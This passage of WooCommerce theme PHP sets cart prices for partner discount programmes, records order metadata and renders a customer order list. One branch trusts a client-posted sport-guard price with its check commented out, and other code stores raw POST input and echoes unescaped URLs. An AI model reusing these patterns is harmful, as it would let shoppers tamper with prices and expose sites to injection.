            if (isset($cart_item['vip_sale_price'])) {
                $geha_price = (float) $cart_item['vip_sale_price'];
                $cart_item['data']->set_price($geha_price);
            }
            if (isset($cart_item['shine_sale_price'])) {
                $geha_price = (float) $cart_item['shine_sale_price'];
                $cart_item['data']->set_price($geha_price);
            }
            if (isset($cart_item['ucc_sale_price'])) {
                $geha_price = (float) $cart_item['ucc_sale_price'];
                $cart_item['data']->set_price($geha_price);
            }
            if (isset($cart_item['sbrcustomer_sale_price'])) {
                $geha_price = (float) $cart_item['sbrcustomer_sale_price'];
                $cart_item['data']->set_price($geha_price);
            }
            if (isset($cart_item['vip_custom_lander_price'])) {
                $geha_price = (float) $cart_item['vip_custom_lander_price'];
                $cart_item['data']->set_price($geha_price);
            }

            /***sweatcoin***/
            if (isset($cart_item['sweatcoin_sale_price'])) {
                $sweatcoin_price = (float) $cart_item['sweatcoin_sale_price'];
                $cart_item['data']->set_price($sweatcoin_price);
            }
            if (isset($cart_item['1dental_sale_price'])) {
                $dental_price = (float) $cart_item['1dental_sale_price'];
                $cart_item['data']->set_price($dental_price);
            }
            if (isset($cart_item['benefithub_sale_price'])) {
                $benefithub_price = (float) $cart_item['benefithub_sale_price'];
                $cart_item['data']->set_price($benefithub_price);
            }
            /* Perkspot */
            if (isset($cart_item['perkspot_sale_price'])) {
                $perkspot_price = (float) $cart_item['perkspot_sale_price'];
                $cart_item['data']->set_price($perkspot_price);
            }
            /* Abenity */
            if (isset($cart_item['abenity_sale_price'])) {
                $abenity_price = (float) $cart_item['abenity_sale_price'];
                $cart_item['data']->set_price($abenity_price);
            }
            /* GoodRx */
            if (isset($cart_item['goodrx_sale_price'])) {
                $goodrx_price = (float) $cart_item['goodrx_sale_price'];
                $cart_item['data']->set_price($goodrx_price);
            }/* Teledentists */
            if (isset($cart_item['teledentists_sale_price'])) {
                $teledentists_price = (float) $cart_item['teledentists_sale_price'];
                $cart_item['data']->set_price($teledentists_price);
            }
            if (isset($cart_item['insurance_lander_price'])) {
                $insurance_lander_price = (float) $cart_item['insurance_lander_price'];
                $cart_item['data']->set_price($insurance_lander_price);
            }
            /******/

            if (isset($cart_item['bogo_discount'])) {
                $bogo_quantity = $cart_item['quantity'];
            }
            if (isset($cart_item['bogo_added']) && $pid == $cart_item['bogo_added']) {
                /// $cart_item['data']->set_price(0.00);
            }
            if (isset($cart_item['free_probiotics'])) {

                $cart_item['data']->set_price(0.00);
            }
            if (isset($cart_item['plus_30_test'])) {
                $_product = wc_get_product($pid);
                $plus_price = (float) get_post_meta($pid, 'plus_value', true);

                if ($plus_price != '') {
                    //  $price_existing = $cart_item['data']->get_price();
                    $price_existing = $_product->get_price();
                    $updated_price =  $price_existing + $plus_price;
                    $cart_item['data']->set_price($updated_price);
                }
            }
            if (isset($cart_item['minus_30_test'])) {
                $_product = wc_get_product($pid);
                $minus_price = (float) get_post_meta($pid, 'minus_value', true);
                if ($minus_price != '') {
                    //$price_existing = $cart_item['data']->get_price();
                    $price_existing = $_product->get_price();
                    $updated_price =  $price_existing - $minus_price;
                    $cart_item['data']->set_price($updated_price);
                }
            }

            if (isset($cart_item['mouth_guard_color']) || isset($cart_item['mouth_guard_number'])) {
                $_product = wc_get_product($pid);
                $plus_price = PLUS_PRICE_MOUTH_GUARD;

                if ($plus_price != '') {
                    //  $price_existing = $cart_item['data']->get_price();
                    $price_existing = isset($cart_item['vip_sale_price'])?$cart_item['vip_sale_price']:$_product->get_price();
                    $updated_price =  $price_existing + $plus_price;
                    $cart_item['data']->set_price($updated_price);
                }
            }
            if (isset($cart_item['free_probiotics']) && $subtotal_incl_tax < 50) {
                WC()->cart->remove_cart_item($hash);
            }
        }
        if ($sale_discount != 0) {
            $cart->add_fee('sale discount', -$sale_discount);
        }
        if ($sale_discount_geha != 0) {
            $cart->add_fee('geha sale discount', -$sale_discount_geha);
        }
        if ($subscriber_exclusive_deals_discount != 0) {
            $cart->add_fee('Exclusive Deals Discount', -$subscriber_exclusive_deals_discount);
        }
    }

    function convertToCamelCase($string) {
        // Use a regex to find hyphens followed by any character
        return preg_replace_callback('/-(.)/', function($matches) {
            // Return the uppercase of the character that follows the hyphen
            return strtoupper($matches[1]);
        }, $string);
    }

    function set_extra_sale_discount_true($cart_item_data, $product_id, $variation_id)
    {
        $page = isset($_POST['page'])?$_POST['page']:"";
        $pageModified = isset($_POST['page'])?convertToCamelCase($_POST['page']):"";
        
        if ($product_id == SHIPPING_PROTECTION_PRODUCT) {
            return $cart_item_data;
        }
        if (isset($_POST['discount'])) {
            $cart_item_data['sale_discount'] = get_post_meta($product_id, 'sale_page_discount', true);
        }
        if (isset($_POST['discount_exclusive_deals'])) {
            $cart_item_data['subscriber_exclusive_deals_discount'] = get_post_meta($product_id, 'subscriber_exclusive_deals_discount', true);
        }
        if (isset($_POST['bogo_discount'])) {
            $cart_item_data['bogo_discount'] = $_POST['bogo_discount'];
        }
        if (isset($_POST['bogo_added'])) {
           //
        }
        if (isset($_POST['discount_geha'])) {
            $cart_item_data['sale_discount_geha'] = get_post_meta($product_id, 'sale_page_discount_geha', true);
        }
        if (isset($_POST['4_nightguards_package'])) {
            $cart_item_data['4_nightguards_package'] = get_post_meta($product_id, '4_nightguards_package', true);
            $cart_item_data['reorder_plan'] = '4_nightguards_package';
        }
        if (isset($_POST['2_nightguards_package'])) {
            $cart_item_data['2_nightguards_package'] = get_post_meta($product_id, '2_nightguards_package', true);
            $cart_item_data['reorder_plan'] = '2_nightguards_package';
        }
        if (isset($_POST['tray_number']) && $_POST['tray_number'] <> '') {
            $cart_item_data['tray_number'] = $_POST['tray_number'];
        }
        if (isset($_POST['1_nightguards_package'])) {
            $cart_item_data['1_nightguards_package'] = get_post_meta($product_id, '1_nightguards_package', true);
            $cart_item_data['reorder_plan'] = '1_nightguards_package';
        }
        if (isset($_POST['4_nightguards_package_3mm'])) {
            $cart_item_data['4_nightguards_package_3mm'] = get_post_meta($product_id, '4_nightguards_package', true);
            $cart_item_data['reorder_plan'] = '4_nightguards_package_3mm';
        }
        if (isset($_POST['2_nightguards_package_3mm'])) {
            $cart_item_data['2_nightguards_package_3mm'] = get_post_meta($product_id, '2_nightguards_package', true);
            $cart_item_data['reorder_plan'] = '2_nightguards_package_3mm';
        }

        if (isset($_POST['1_nightguards_package_3mm'])) {
            $cart_item_data['1_nightguards_package_3mm'] = get_post_meta($product_id, '1_nightguards_package', true);
            $cart_item_data['reorder_plan'] = '1_nightguards_package_3mm';
        }
        if (isset($_POST['any_whitening_system'])) {
            $cart_item_data['any_whitening_system'] = get_post_meta($product_id, 'any_whitening_system', true);
            $cart_item_data['reorder_plan'] = 'any_whitening_system';
        }
        if (isset($_POST['mouth_guard_color'])) {
            $cart_item_data['mouth_guard_color'] = $_POST['mouth_guard_color'];
        }
        if (isset($_POST['mouth_guard_number'])) {
            $cart_item_data['mouth_guard_number'] = $_POST['mouth_guard_number'];
        }
        /**********************New Price**************************************** */

        if (isset($_POST['4_nightguards_package_new'])) {
            $cart_item_data['4_nightguards_package_new'] = get_post_meta($product_id, '4_nightguards_package_new', true);
            $cart_item_data['reorder_plan'] = '4_nightguards_package_new';
        }

        if (isset($_POST['2_nightguards_package_new'])) {
            $cart_item_data['2_nightguards_package_new'] = get_post_meta($product_id, '2_nightguards_package_new', true);
            $cart_item_data['reorder_plan'] = '2_nightguards_package_new';
        }

        if (isset($_POST['1_nightguards_package_new'])) {
            $cart_item_data['1_nightguards_package_new'] = get_post_meta($product_id, '1_nightguards_package_new', true);
            $cart_item_data['reorder_plan'] = '1_nightguards_package_new';
        }

        if (isset($_POST['4_nightguards_package_3mm_new'])) {
            $cart_item_data['4_nightguards_package_3mm_new'] = get_post_meta($product_id, '4_nightguards_package_new', true);
            $cart_item_data['reorder_plan'] = '4_nightguards_package_3mm_new';
        }

        if (isset($_POST['2_nightguards_package_3mm_new'])) {
            $cart_item_data['2_nightguards_package_3mm_new'] = get_post_meta($product_id, '2_nightguards_package_new', true);
            $cart_item_data['reorder_plan'] = '2_nightguards_package_3mm_new';
        }

        if (isset($_POST['1_nightguards_package_3mm_new'])) {
            $cart_item_data['1_nightguards_package_3mm_new'] = get_post_meta($product_id, '1_nightguards_package_new', true);
            $cart_item_data['reorder_plan'] = '1_nightguards_package_3mm_new';
        }

        /***********************End PRICE************************************** */
        if (isset($_POST['rdh_sale_price']) && isset($_POST['rdhc_user_id'])) {
            $existing_value = get_user_meta($_POST['rdhc_user_id'], 'rdhc_discounted_products', true);
            if (isset($existing_value[$product_id]) && $existing_value[$product_id] == $_POST['rdh_sale_price']) {
                $cart_item_data['rdh_sale_price'] = $_POST['rdh_sale_price'];
            }
        }
        
        if (isset($_POST['geha_sale_price']) && isset($_POST['geha_sale_price'])) {
            $geha_existing_value = get_post_meta(GEHA_TEMPLATE_PAGE_ID, 'geha_discounted_products', true);
            if (isset($geha_existing_value[$product_id]) && $geha_existing_value[$product_id] == $_POST['geha_sale_price']) {
                $cart_item_data['geha_sale_price'] = $_POST['geha_sale_price'];
            }
        }
        // if (isset($_POST['geha_probiotics_price']) && isset($_POST['geha_probiotics_price'])) {
        //     $geha_existing_value = get_post_meta($_POST['product_id'], 'geha_discounted_price_probiotics', true);
        //     if ( $geha_existing_value ==$_POST['geha_probiotics_price']) {
        //         $product = wc_get_product($product_id);
        //         $cart_item_data['geha_sale_price'] = $_POST['geha_probiotics_price'];
        //     }
        // }

        if (isset($_POST[$pageModified.'_probiotics_price']) && isset($_POST[$pageModified.'_probiotics_price'])) {
            $geha_existing_value = get_post_meta($_POST['product_id'], $page.'_discounted_price_probiotics', true);
            //echo $geha_existing_value;exit;
            if (round($geha_existing_value, 2) == round($_POST[$pageModified.'_probiotics_price'], 2)) {
                $product = wc_get_product($product_id);
                $cart_item_data['vip_custom_lander_price'] = $_POST[$pageModified.'_probiotics_price'];
            }
        }

        if (isset($_POST[$pageModified.'_enamel_price']) && isset($_POST[$pageModified.'_enamel_price'])) {
            $geha_existing_value = get_post_meta($_POST['product_id'], $page.'_discounted_price_enamelarmour', true);                 
            if (round($geha_existing_value, 2) == round($_POST[$pageModified.'_enamel_price'], 2)) {
                $product = wc_get_product($product_id);
                $cart_item_data['vip_custom_lander_price'] = $_POST[$pageModified.'_enamel_price'];
            }
        }

        if (isset($_POST[$pageModified.'_plaque_price']) && isset($_POST[$pageModified.'_plaque_price'])) {
            $geha_existing_value = get_post_meta($_POST['product_id'], $page.'_discounted_price_plaquehighlighter', true);                 
            if (round($geha_existing_value, 2) == round($_POST[$pageModified.'_plaque_price'], 2)) {
                $product = wc_get_product($product_id);
                $cart_item_data['vip_custom_lander_price'] = $_POST[$pageModified.'_plaque_price'];
            }
        }

        if (isset($_POST['vip_sale_price']) && isset($_POST['vip_sale_price'])) {
            $geha_existing_value = get_post_meta(VIP_SALE_PAGE_ID, 'vip_discounted_products', true);
            if (isset($geha_existing_value[$product_id]) && (int) $geha_existing_value[$product_id] == (int) $_POST['vip_sale_price']) {
                $product = wc_get_product($product_id);
                $cart_item_data['vip_sale_price'] = $_POST['vip_sale_price'];
            }
        }
        if (isset($_POST['special_price_sport_guard']) && isset($_POST['special_price_sport_guard'])) {
            $geha_existing_value = get_post_meta(VIP_SALE_PAGE_ID, 'vip_discounted_products', true);
            $cart_item_data['vip_sale_price'] = $_POST['special_price_sport_guard'];
            // if (isset($geha_existing_value[$product_id]) && (int) $geha_existing_value[$product_id] == (int) $_POST['vip_sale_price']) {
            //     $product = wc_get_product($product_id);
            //     $cart_item_data['vip_sale_price'] = $_POST['vip_sale_price'];
            // }
        }
        if (isset($_POST['shine_sale_price']) && isset($_POST['shine_sale_price'])) {
            $geha_existing_value = get_post_meta(SHINE_PAGE_ID, 'shine_discounted_products', true);
            if (isset($geha_existing_value[$product_id]) && (int) $geha_existing_value[$product_id] == (int) $_POST['shine_sale_price']) {
                $product = wc_get_product($product_id);
                $cart_item_data['shine_sale_price'] = $_POST['shine_sale_price'];
            }
        }
        if (isset($_POST['ucc_sale_price']) && isset($_POST['ucc_sale_price'])) {
            $geha_existing_value = get_post_meta(UCC_PAGE_ID, 'ucc_discounted_products', true);
            if (isset($geha_existing_value[$product_id]) && (int) $geha_existing_value[$product_id] == (int) $_POST['ucc_sale_price']) {
                $product = wc_get_product($product_id);
                $cart_item_data['ucc_sale_price'] = $_POST['ucc_sale_price'];
            }
        }
        if (isset($_POST['sbrcustomer_sale_price'])) {
            $geha_existing_value = get_post_meta(CUSTOMER_DISCOUNT_PAGE_ID, 'sbrcustomer_discounted_products', true);
            if (isset($geha_existing_value[$product_id]) && (int) $geha_existing_value[$product_id] == (int) $_POST['sbrcustomer_sale_price']) {
                $product = wc_get_product($product_id);
                $cart_item_data['sbrcustomer_sale_price'] = $_POST['sbrcustomer_sale_price'];
            }
        }
        if (isset($_POST['geha_user']) && $_POST['geha_user'] != '') {
            $cart_item_data['geha_user'] = 'yes';
        }

        /*******sweatcoin sale price*********/
        if (isset($_POST['sweatcoin_sale_price']) && isset($_POST['sweatcoin_sale_price'])) {
            $partner_existing_value = get_post_meta(SWEAT_COIN_TEMPLATE_PAGE_ID, 'sweatcoin_discounted_products', true);
            if (isset($partner_existing_value[$product_id]) && $partner_existing_value[$product_id] == $_POST['sweatcoin_sale_price']) {
                $product = wc_get_product($product_id);
                //  if ($product->get_type() == 'composite') {
                $cart_item_data['sweatcoin_sale_price'] = $_POST['sweatcoin_sale_price'];
                //  }
            }
        }
        if (isset($_POST['sweatcoin_user']) && $_POST['sweatcoin_user'] != '') {
            $cart_item_data['sweatcoin_user'] = 'yes';
        }
        if (isset($_POST['1dental_sale_price']) && isset($_POST['1dental_sale_price'])) {
            $partner_existing_value = get_post_meta(ONE_DENTAL_TEMPLATE_PAGE_ID, '1dental_discounted_products', true);
            if (isset($partner_existing_value[$product_id]) && $partner_existing_value[$product_id] == $_POST['1dental_sale_price']) {
                $product = wc_get_product($product_id);
                $cart_item_data['1dental_sale_price'] = $_POST['1dental_sale_price'];
            }
        }
        if (isset($_POST['1dental_user']) && $_POST['1dental_user'] != '') {
            $cart_item_data['1dental_user'] = 'yes';
        }
        if (isset($_POST['benefithub_sale_price']) && isset($_POST['benefithub_sale_price'])) {
            $partner_existing_value = get_post_meta(BENEFIT_TEMPLATE_PAGE_ID, 'benefithub_discounted_products', true);
            if (isset($partner_existing_value[$product_id]) && $partner_existing_value[$product_id] == $_POST['benefithub_sale_price']) {
                $product = wc_get_product($product_id);
                $cart_item_data['benefithub_sale_price'] = $_POST['benefithub_sale_price'];
            }
        }
        /* Perkspot*/
        if (isset($_POST['perkspot_sale_price']) && isset($_POST['perkspot_sale_price'])) {
            $partner_existing_value = get_post_meta(PERK_SPOT_TEMPLATE_PAGE_ID, 'perkspot_discounted_products', true);
            if (isset($partner_existing_value[$product_id]) && $partner_existing_value[$product_id] == $_POST['perkspot_sale_price']) {
                $product = wc_get_product($product_id);
                $cart_item_data['perkspot_sale_price'] = $_POST['perkspot_sale_price'];
            }
        }
        /* Abenity*/
        if (isset($_POST['abenity_sale_price']) && isset($_POST['abenity_sale_price'])) {
            $partner_existing_value = get_post_meta(ABNENITY_TEMPLATE_PAGE_ID, 'abenity_discounted_products', true);
            if (isset($partner_existing_value[$product_id]) && $partner_existing_value[$product_id] == $_POST['abenity_sale_price']) {
                $product = wc_get_product($product_id);
                $cart_item_data['abenity_sale_price'] = $_POST['abenity_sale_price'];
            }
        }

        /* GoodRx*/
        if (isset($_POST['goodrx_sale_price']) && isset($_POST['goodrx_sale_price'])) {
            $partner_existing_value = get_post_meta(GOOD_RX_TEMPLATE_PAGE_ID, 'goodrx_discounted_products', true);
            if (isset($partner_existing_value[$product_id]) && $partner_existing_value[$product_id] == $_POST['goodrx_sale_price']) {
                $product = wc_get_product($product_id);
                $cart_item_data['goodrx_sale_price'] = $_POST['goodrx_sale_price'];
            }
        }
        /* Teledentists*/
        if (isset($_POST['teledentists_sale_price']) && isset($_POST['teledentists_sale_price'])) {
            $partner_existing_value = get_post_meta(TELEDENTIST_TEMPLATE_PAGE_ID, 'teledentists_discounted_products', true);
            if (isset($partner_existing_value[$product_id]) && $partner_existing_value[$product_id] == $_POST['teledentists_sale_price']) {
                $product = wc_get_product($product_id);
                $cart_item_data['teledentists_sale_price'] = $_POST['teledentists_sale_price'];
            }
        }
        if (isset($_POST['insurance_lander_price']) && isset($_POST['insurance_lander_price'])) {
            $partner_existing_value = get_post_meta(INSURANCE_TEMPLATE_PAGE_ID, 'insurance_lander_discounted_products', true);
            if (isset($partner_existing_value[$product_id]) && $partner_existing_value[$product_id] == $_POST['insurance_lander_price']) {
                $product = wc_get_product($product_id);
                $cart_item_data['insurance_lander_price'] = $_POST['insurance_lander_price'];
            }
        }
        if (isset($_POST['benefithub_user']) && $_POST['benefithub_user'] != '') {
            $cart_item_data['benefithub_user'] = 'yes';
        }
        if (isset($_POST['perkspot_user']) && $_POST['perkspot_user'] != '') {
            $cart_item_data['perkspot_user'] = 'yes';
        }
        if (isset($_POST['abenity_user']) && $_POST['abenity_user'] != '') {
            $cart_item_data['abenity_user'] = 'yes';
        }
        if (isset($_POST['goodrx_user']) && $_POST['goodrx_user'] != '') {
            $cart_item_data['goodrx_user'] = 'yes';
        }
        if (isset($_POST['ucc_user']) && $_POST['ucc_user'] != '') {
            $cart_item_data['ucc_user'] = 'yes';
        }
        
        if (isset($_POST['teledentists_user']) && $_POST['teledentists_user'] != '') {
            $cart_item_data['teledentists_user'] = 'yes';
        }
        if (isset($_POST['insurance_lander']) && $_POST['insurance_lander'] != '') {
            $cart_item_data['insurance_lander'] = 'yes';
        }
        if (isset($_POST['rdhc_user_id']) && $_POST['rdhc_user_id'] != '' && isset($_COOKIE['dentist_id'])) {
            $user_access_code = get_user_meta($_COOKIE['dentist_id'], 'access_code', true);
            if($user_access_code!=''){
                $cart_item_data['dentist_user'] =  $_POST['rdhc_user_id'];
            }
        }
        /********************/
        if (isset($_POST['free_probiotics'])) {
            $product = wc_get_product($product_id);
            $cart_item_data['free_probiotics'] = 0.00;
        }
        if (isset($_POST['plus_30_test'])) {
            $product = wc_get_product($product_id);
            $cart_item_data['plus_30_test'] = 30;
        }
        if (isset($_POST['minus_30_test'])) {
            $product = wc_get_product($product_id);
            $cart_item_data['minus_30_test'] = 30;

        }
        $product_feature_image_url = get_the_post_thumbnail_url($product_id, 'medium');

        // Add the product feature image URL to the cart item
        $cart_item_data['product_feature_image_url'] = $product_feature_image_url;

        return $cart_item_data;
    }

    add_filter('woocommerce_add_cart_item_data', 'set_extra_sale_discount_true', 10, 3);

    add_action('woocommerce_new_order_item', 'order_item_meta_update_tray_number', 10, 3);
    function order_item_meta_update_tray_number($item_id, $values)
    {
        if (isset($values->legacy_values['tray_number']) && !empty($values->legacy_values['tray_number'])) {
            global $wpdb;

            // Custom query to retrieve the product ID associated with the order item
            $product_id = $wpdb->get_var(
                $wpdb->prepare(
                    "
                    SELECT order_item_meta.meta_value
                    FROM {$wpdb->prefix}woocommerce_order_itemmeta AS order_item_meta
                    LEFT JOIN {$wpdb->prefix}woocommerce_order_items AS order_items ON order_item_meta.order_item_id = order_items.order_item_id
                    WHERE order_items.order_item_id = %d
                    AND order_item_meta.meta_key = '_product_id'
                    ",
                    $item_id
                )
            );
            if ($product_id != SHIPPING_PROTECTION_PRODUCT) {
                wc_add_order_item_meta($item_id, '_tray_number',  $values->legacy_values['tray_number']);
            }
        }
        
        if (isset($values->legacy_values['reorder_plan']) && !empty($values->legacy_values['reorder_plan'])) {
            wc_add_order_item_meta($item_id, '_reorder_plan',  $values->legacy_values['reorder_plan']);
        }
        if (isset($values->legacy_values['geha_user']) && !empty($values->legacy_values['geha_user'])) {
            wc_add_order_item_meta($item_id, '_geha_source',  'lander');
        }
        if (isset($values->legacy_values['sweatcoin_user']) && !empty($values->legacy_values['sweatcoin_user'])) {
            wc_add_order_item_meta($item_id, '_source',  'sweatcoin');
        }
        if (isset($values->legacy_values['1dental_user']) && !empty($values->legacy_values['1dental_user'])) {
            wc_add_order_item_meta($item_id, '_source',  '1dental');
        }
        if (isset($values->legacy_values['dentist_user']) && !empty($values->legacy_values['dentist_user'])) {
            wc_add_order_item_meta($item_id, '_source',  'dentist');
            wc_add_order_item_meta($item_id, 'dentist_id',  $values->legacy_values['dentist_user']);
        }
        if (isset($values->legacy_values['benefithub_user']) && !empty($values->legacy_values['benefithub_user'])) {
            wc_add_order_item_meta($item_id, '_source',  'benefithub');
        }
        if (isset($values->legacy_values['perkspot_user']) && !empty($values->legacy_values['perkspot_user'])) {
            wc_add_order_item_meta($item_id, '_source',  'perkspot');
        }
        if (isset($values->legacy_values['abenity_user']) && !empty($values->legacy_values['abenity_user'])) {
            wc_add_order_item_meta($item_id, '_source',  'abenity');
        }
        if (isset($values->legacy_values['goodrx_user']) && !empty($values->legacy_values['goodrx_user'])) {
            wc_add_order_item_meta($item_id, '_source',  'goodrx');
        }
        if (isset($values->legacy_values['teledentists_user']) && !empty($values->legacy_values['teledentists_user'])) {
            wc_add_order_item_meta($item_id, '_source',  'teledentists');
        }
        if (isset($values->legacy_values['insurance_lander']) && !empty($values->legacy_values['insurance_lander'])) {
            wc_add_order_item_meta($item_id, '_source',  'insurance_lander');
        }
        if (isset($values->legacy_values['mouth_guard_number']) && !empty($values->legacy_values['mouth_guard_number'])) {
            wc_add_order_item_meta($item_id, 'mouth_guard_number', $values->legacy_values['mouth_guard_number']);
        }
        if (isset($values->legacy_values['mouth_guard_color']) && !empty($values->legacy_values['mouth_guard_color'])) {
            wc_add_order_item_meta($item_id, 'mouth_guard_color', $values->legacy_values['mouth_guard_color']);
        }
    }

    // disable multiple coupons
    add_action('woocommerce_before_calculate_totals', 'mbt_get_applied_coupons', 10, 1);

    // Get the current applied coupon and compare it with other applied coupons
    function mbt_get_applied_coupons($cart)
    {
        if (is_admin() && !defined('DOING_AJAX'))
            return;

        if (did_action('woocommerce_before_calculate_totals') >= 2)
            return;

        // For more than 1 applied coupons only
        if (sizeof($cart->get_applied_coupons()) > 1 && $coupons = $cart->get_applied_coupons()) {
            // Remove the first applied coupon keeping only the last appield coupon
            $cart->remove_coupon(reset($coupons));
        }
    }

    function has_bought_mbt($user_id = '')
    {
        // Get all customer orders
        $customer_orders = get_posts(array(
            'numberposts' => -1,
            'meta_key' => '_customer_user',
            'meta_value' => $user_id,
            'post_type' => 'shop_order', // WC orders post type
            'post_status' => array('wc-completed', 'wc-shipped', 'wc-refunded') // Only orders with status "completed"
        ));
        // return "true" when customer has already one order
        return count($customer_orders) > 0 ? true : false;
    }

    add_action('wp_ajax_get_tab_data_affiliate', 'get_tab_data_affiliate');

    function get_tab_data_affiliate()
    {
        $active_tab = affwp_get_active_affiliate_area_tab();
        $tab_id = isset($_POST['tab']) ? $_POST['tab'] : '';
        if (affwp_get_affiliate_id() == '') {
            // affwp_get_affiliate_id() = 8140;
        }
        echo affwp_render_affiliate_dashboard_tab($tab_id);
        //require get_stylesheet_directory() . '/affiliatewp/dashboard.php';
        die();
    }

    function is_coupon_in_white_listed_prefix($coupon_code)
    {
        if (is_array(WHILTE_LISTED_COUPONS_PREFIX) && count(WHILTE_LISTED_COUPONS_PREFIX) > 0) {
            foreach (WHILTE_LISTED_COUPONS_PREFIX as $substring) {
                $substring = strtolower($substring);
                $coupon_code = strtolower($coupon_code);
                if (strpos($coupon_code, $substring) !== false) {
                    return true;
                }
            }
        }
        return false;
    }

    add_filter('body_class', 'mbt_body_classes_affilaites');

    function mbt_body_classes_affilaites($classes)
    {
        if (strpos($_SERVER['REQUEST_URI'], "reward")) {
            $classes[] = 'affiliate_dashboard-cls';
        }
        return $classes;
    }

    add_action('wp_ajax_checkout_pay_for_order_auth_check', 'checkout_pay_for_order_auth_check');
    add_action('wp_ajax_nopriv_checkout_pay_for_order_auth_check', 'checkout_pay_for_order_auth_check');

    function checkout_pay_for_order_auth_check()
    {
        if (is_user_logged_in()) {
            echo 'yes';
        } else {
            echo 'no';
        }
        die();
    }

    add_action('before_woocommerce_pay', 'bbloomer_order_pay_billing_address_mbt');

    function bbloomer_order_pay_billing_address_mbt()
    {

        // ONLY RUN IF PENDING ORDER EXISTS
        if (isset($_GET['pay_for_order'], $_GET['key'])) {

            // GET ORDER ID FROM URL BASENAME
            $order_id = intval(basename(strtok($_SERVER["REQUEST_URI"], '?')));
            $order = wc_get_order($order_id);
            echo '<h3 style="color:red;"> Your order payment is still pending. Kindly retry the transaction to process the order further</h3>';
        }
    }

    /*
  IF URL CONTAINS UTM # Redirect
 */
    add_action('init', 'utm_hashed_url_redirect');

    function utm_hashed_url_redirect()
    {
        $url = 'https://' . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
        if (wp_basename($url) == 'sensitive-teeth-whitening-trays') {
            echo $new_url = str_replace('sensitive-teeth-whitening-trays', 'teeth-whitening-trays/#sensitive', $url);
            wp_safe_redirect($new_url);
            exit();
        }
    }

    function getCustomerMyAccountOrders_callback_desktop()
{
    global $wpdb;
    $paged = isset($_REQUEST['paged']) ? $_REQUEST['paged'] : 1;
    $postsPerPage = -1;
    if (current_user_can('administrator')) {
        //$postsPerPage = 5;
    }

    $customer_orders = array();
    $user_id = get_current_user_id();
    $order_type = isset($_REQUEST['selectOrderType']) ? $_REQUEST['selectOrderType']:'';

    $joinQuery = '';
    $joinCondition = '';
    if ($order_type == 'subscription') {
        $joinQuery = ' LEFT JOIN wp_postmeta AS pm2 ON pm2.post_id = wp_posts.ID ';
        $joinCondition = " AND pm2.meta_key = '_subscriptionId' ";
    } elseif ($order_type == 'regular') {
        $joinQuery = '';
        $joinCondition = " AND NOT EXISTS (
                SELECT * FROM wp_postmeta
                 WHERE wp_postmeta.meta_key = '_subscriptionId'
                  AND wp_postmeta.post_id=wp_posts.ID
              ) ";
    }
    //$user_id = 124015;
    $product_for_user = "SELECT DISTINCT(wp_posts.ID) as post_id FROM wp_posts
        LEFT JOIN wp_postmeta AS pm1 ON pm1.post_id = wp_posts.ID  $joinQuery
        WHERE wp_posts.post_status != 'trash' AND pm1.meta_key = '_customer_user' AND pm1.meta_value = " . $user_id . " $joinCondition ORDER BY wp_posts.post_date DESC";
    $results1 = $wpdb->get_results($product_for_user, 'ARRAY_A');
    if (is_array($results1) && count($results1) > 0) {
        foreach ($results1 as $key => $res) {

            $customer_orders[] = $res['post_id'];
        }
    }
    ?>



    <div class="customerOrderListing">
        <script>
            function goToReorderParent(traynum,pid) {
//alert(traynum);
parntcls = '.parent-'+traynum;
jQuery('html, body').animate({
                scrollTop: jQuery(parntcls).offset().top-100
            }, 1000);
jQuery(parntcls).find('.mmContainerWrapper').show();
jQuery(parntcls).find("input[type='radio'][value='" + pid + "']").prop("checked", true).trigger('change');

            }
        </script>

    </div>

    <?php
    $show_re_order = true;
    $three_way_products_count = 0;
    $re_order_parent_product_id = '';
    $arr_ng_reorders = NG_REORDER_PRODUCTS;
    foreach ($customer_orders as $customer_order) {
        $order = wc_get_order($customer_order);
        foreach ($order->get_items() as $item_id => $item) {

        $product_id = $item->get_product_id();
        $three_way_ship_product = get_post_meta($product_id, 'three_way_ship_product', true);
        
        if($three_way_ship_product) {
            $re_order_parent_product_id = $product_id;
            $three_way_products_count++;
        }
    
    }
}
    if($three_way_products_count>1){
        $show_re_order = false;
    }
    //echo $three_way_products_count;
    //shine#RB
foreach ($customer_orders as $customer_order) {
        $order = wc_get_order($customer_order);
        $item_count = $order->get_item_count() - $order->get_item_count_refunded();
        $items_count = 0;
        $orderItemArray = array();
        $counterItem = array();
        $Orderhtml = '';
        $shine = get_post_meta($customer_order, '_shineSubcId', true);
        ?>
        <div class="orderContainner <?php echo ($shine?'shineSubscribed':'');?>">
            <div class="upperOrderArea">
                <div class="sbr-ordernumber mFlex">
                    <a href="<?php echo esc_url($order->get_view_order_url()); ?>" class="orderTopLInkAnchor">
                        <h3><span class="text-blue"><?php echo $order->get_order_number(); ?></span></h3>
                    </a>

                </div>


                <div class="totalAmount hiddenDesktop">
                    <div class="d-flex  ajustLayoutOnlyMobile align-items-center">
                        <div class="flex-div font-mont">
                            <span class="dateOption ">Total:</span>
                            <span class="text-blue priceDispaly">
                                <?php echo $order->get_formatted_order_total(); ?>
                            </span>
                        </div>

                        <div class="actionOrderLevel">
                            <?php
$order_number = $order->get_id();

        $invoice = wc_pip()->get_document('invoice', array('order' => $order));

        if ($invoice && $invoice->has_invoice_number()) {

            $invoiceLink = wp_nonce_url(
                add_query_arg([
                    'wc_pip_action' => 'print',
                    'wc_pip_document' => 'invoice',
                    'order_id' => $order->get_id(),
                ]),
                'wc_pip_document'
            );
            ?>
                                <a target="_blank" href="<?php echo site_url($invoiceLink); ?>" class="text-blue">Invoice</a>
                            <?php
}

        if ($order->get_status() == 'pending' || $order->get_status() == 'failed') {
            ?>
                                <a href="<?php echo $order->get_checkout_payment_url(); ?>" class="text-blue orangeButton">Pay Now</a>
                            <?php
} else if ($order->get_status() == 'processing') {
            echo cancelOrderButton($order_number, $order->get_order_number());
        } else {
            if (in_array($order->get_status(), array('partial_ship', 'shipped'))) {

                $query = "SELECT  st.easyPostShipmentTrackingUrl FROM " . SB_EASYPOST_TABLE . " as st";
                $query .= " JOIN " . SB_SHIPMENT_ORDERS_TABLE . " as l ON l.shipment_id=st.shipment_id";
                $query .= " WHERE  l.order_id = $order_number AND st.shipmentState IS  NULL";
                $query .= " ORDER BY st.shipment_id DESC ";
                $query_tracking_number = $wpdb->get_var($query);
                if ($query_tracking_number) {
                    echo '</span><a href="' . $query_tracking_number . '" target="_blank" class="text-blue">Track <span class="hidden-mobile">Order</span></a>';
                    echo refundOrderButton($order_number, $order->get_order_number());
                }
            } else {
                //
            }
        }
        ?>
                        </div>
                    </div>
                </div>

